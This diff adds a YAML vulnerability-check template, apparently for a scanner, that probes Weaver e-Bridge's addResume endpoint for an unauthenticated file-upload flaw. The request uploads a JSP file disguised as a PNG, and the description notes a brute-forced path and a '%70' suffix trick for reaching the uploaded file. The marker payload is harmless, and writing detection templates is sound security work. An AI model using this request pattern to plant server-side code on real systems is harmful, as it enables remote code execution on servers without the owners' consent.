@@ -1,0 +1,14 @@
+name: 泛微云桥e-Bridge-addResume文件上传
+description: >
+  访问路径http://ip/upload/202411(当前日期)/随机1-2位大写字母/only_test.js%70（需爆破）
+alwaysExecute: false
+matchCount: 1
+rules:   
+  - method: POST
+    path: /wxclient/app/recruit/resume/addResume?fileElementld=H
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDOVhr5SwLI1wpry7    
+    body: "------WebKitFormBoundaryDOVhr5SwLI1wpry7\r\nContent-Disposition: form-data; name=\"file\"; filename=\"only_test.jsp\"\r\nContent-Type: image/png\r\n\r\n<%out.println(\"only_test\");%>\r\n------WebKitFormBoundaryDOVhr5SwLI1wpry7\r\nContent-Disposition: form-data; name=\"file\"; filename=\"only_test.jsp\"\r\nContent-Type: image/png\r\n\r\n1\r\n------WebKitFormBoundaryDOVhr5SwLI1wpry7--"
+    expression:
+      status: 200
+      body_all: ["success"] 
